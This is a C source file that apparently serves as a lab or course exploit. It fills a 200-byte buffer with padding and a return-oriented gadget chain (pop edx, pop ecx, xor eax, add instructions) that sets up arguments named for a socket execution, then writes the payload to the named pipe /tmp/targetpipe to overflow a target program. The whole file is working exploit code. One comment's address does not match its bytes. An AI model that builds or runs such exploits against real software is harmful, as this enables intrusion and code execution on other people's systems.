#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[200];

  char pop_edx[] = "\x1b\xdc\xb9\xbb";
  char pop_ecx[] = "\x22\xa4\xba\xbb";

  char xor_eax[] = "\xc2\xb3\xa9\xbb"; 

  char add_dl_al[] = "\x07\x46\xbb\xbb";
  char add_cl_ah[] = "\xd7\xbd\xa7\xbb";

  char socket_exec_arg1[] = "\x8a\x01\x01\x01";
  char socket_exec_arg2[] = "\x01\x01\x01\x01";

  int i;
  // Fill up buffer
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x01",1);

  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 135, socket_exec_arg1);  
  strcpy(bufr + 139, pop_ecx); // 0xbbaa422
  strcpy(bufr + 143, socket_exec_arg2);
  strcpy(bufr + 147, xor_eax);
  strcpy(bufr + 151, add_dl_al); // 0xbbbb4607
  strcpy(bufr + 155, add_cl_ah); // 0xbba7bdd7
  writecmd(PIPEPATH, bufr);
  
  return 0;
}
